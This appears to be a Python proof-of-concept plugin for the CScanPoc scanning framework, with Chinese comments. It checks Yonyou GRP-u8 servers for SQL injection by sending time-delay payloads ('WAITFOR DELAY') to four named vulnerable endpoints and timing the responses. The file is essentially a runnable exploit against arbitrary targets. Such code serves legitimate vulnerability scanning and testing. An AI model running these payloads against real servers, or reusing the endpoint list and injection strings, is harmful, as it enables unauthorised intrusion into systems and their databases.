# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Yonyou_0019'  # 平台漏洞编号，留空
    name = '用友 GRP-u8 四处sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-07-24'  # 漏洞公布时间
    desc = '''
        用友是国内著名的内容管理系统之一，包括协同管理系统、用友NC、用友U8等
        用友 GRP-u8 四处sql注入
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0108912'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Yonyou(用友)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '89ce6614-ffb1-4b32-a230-4d21235a2c93'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vun_urls = ['/IMLoginServlet?pwd=1&uid=1(str)',
                        '/persionTreeServlet?bmdm=1(str)',
                        '/R9iPortal/cm/cm_info_list.jsp?itype_id=3(int)',
                        '/R9iPortal/cm/cm_notice_content.jsp?info_id=4(int)']
            payload_0 = ";WAITFOR%20DELAY%20%270:0:0%27--"
            payload_1 = ";WAITFOR%20DELAY%20%270:0:5%27--"
            for vun_url in vun_urls:
                if vun_url[-5:] == "(int)":
                    payload0 = payload_0
                    payload1 = payload_1
                else:
                    payload0 = "%27"+payload_0
                    payload1 = "%27"+payload_1
                # proxy=('127.0.0.1',8080)
                time0 = time.time()
                code1, head, res, errcode, finalurl = hh.http(
                    arg+vun_url[:-5]+payload1)
                time1 = time.time()
                code2, head, res, errcode, finalurl = hh.http(
                    arg+vun_url[:-5]+payload0)
                time2 = time.time()
                if code1 != 0 and code2 != 0 and ((time1-time0)-(time2-time1)) > 4:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
